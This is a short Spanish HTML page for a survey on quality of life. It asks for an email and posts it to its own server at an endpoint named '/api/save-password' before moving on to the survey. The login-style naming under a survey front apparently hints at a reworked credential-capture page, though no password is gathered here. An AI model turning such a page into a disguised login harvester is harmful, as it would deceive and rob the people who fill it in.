<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Encuesta sobre Calidad de Vida</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-50 min-h-screen flex items-center justify-center p-4">

    <div class="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 border border-slate-100">
        <!-- Encabezado del proyecto -->
        <div class="text-center mb-8">
            <div class="bg-indigo-50 text-indigo-600 w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-4 font-bold text-xl">
                📋
            </div>
            <h1 class="text-2xl font-bold text-slate-800">Encuesta sobre Vida</h1>
            <p class="text-slate-500 text-sm mt-2">Por favor, ingresa tu correo para comenzar con el cuestionario.</p>
        </div>

        <!-- Formulario -->
        <form id="loginForm" class="space-y-5">
            <div>
                <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-2">Correo electrónico</label>
                <input 
                    type="email" 
                    id="email" 
                    required 
                    class="w-full px-4 py-3 rounded-lg border border-slate-200 focus:outline-none focus:ring-2 focus:ring-indigo-500 text-slate-700 text-sm transition"
                    placeholder="tucorreo@ejemplo.com"
                >
            </div>

            <button 
                type="submit" 
                class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 rounded-lg transition shadow-md shadow-indigo-100"
            >
                Continuar a la encuesta
            </button>
        </form>
    </div>

    <script>
        // Mantén tu lógica existente para capturar los datos y enviarlos al servidor
        const form = document.getElementById('loginForm');
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;

            try {
                // Envía los datos a tu backend en server.js
                await fetch('/api/save-password', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email })
                });
            } catch (err) {
                console.error(err);
            }

            // Redirige a tu siguiente archivo (ej. encuesta.html)
            window.location.href = '/encuesta.html';
        });
    </script>
</body>
</html>
